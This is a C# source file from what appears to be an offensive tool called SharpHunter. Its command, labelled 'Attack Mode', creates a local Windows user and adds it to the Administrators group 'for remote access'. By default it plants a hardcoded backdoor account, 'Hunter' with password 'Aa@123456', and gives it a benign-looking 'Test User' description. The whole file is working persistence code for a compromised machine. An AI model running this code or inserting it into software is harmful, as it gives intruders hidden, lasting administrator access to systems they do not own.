using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using SharpHunter.Utils;

namespace SharpHunter.Commands
{
    class AddUserCommand : ICommand
    {
        public void Execute(List<string> args)
        {
            if (!CommonUtils.IsAdminRight())
            {
                Logger.WriteLine("[-] Administrator privileges required!");
                return;
            }
            Logger.TaskHeader("Attack Mode", 1);
            Logger.WriteLine("[*] Add an administrator account for remote access.");

            bool success;
            if (args.Count == 2)
            {
                string username = args[0].ToString();
                string password = args[1].ToString();
                success = AddUserToGroupsFast(username, password, new string[] { "Administrators" });
                if (success)
                {
                    Logger.WriteLine("[+] Username: " + username);
                    Logger.WriteLine("[+] Password: " + password);
                    Logger.WriteLine("[+] Add an administrator user successfully! ");
                }
                else
                {
                    Logger.WriteLine("[-] Failed to add user to group.");
                }
            }
            else
            {
                success = AddUserToGroupsFast("Hunter", "Aa@123456", new string[] { "Administrators" });
                if (success)
                {
                    Logger.WriteLine("[+] Username: Hunter");
                    Logger.WriteLine("[+] Password: Aa@123456");
                    Logger.WriteLine("[+] Add an administrator user successfully! ");
                }
                else
                {
                    Logger.WriteLine("[-] Failed to add user to group.");
                }
            }
        }

        public static bool AddUserToGroupsFast(string username, string password, string[] groupNames)
        {
            try
            {
                DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add(username, "user");
                NewUser.Invoke("SetPassword", new object[] { password });
                NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
                NewUser.CommitChanges();
                DirectoryEntry grp;

                foreach (string groupName in groupNames)
                {
                    grp = AD.Children.Find(groupName, "group");
                    if (grp != null)
                    {
                        grp.Invoke("Add", new object[] { NewUser.Path.ToString() });
                    }
                }

                NewUser.Close();
                AD.Close();

                return true;
            }
            catch (Exception e)
            {
                Logger.WriteLine("[-] An error occurred while adding user to group: " + e.Message);
                return false;
            }
        }

    }
   
}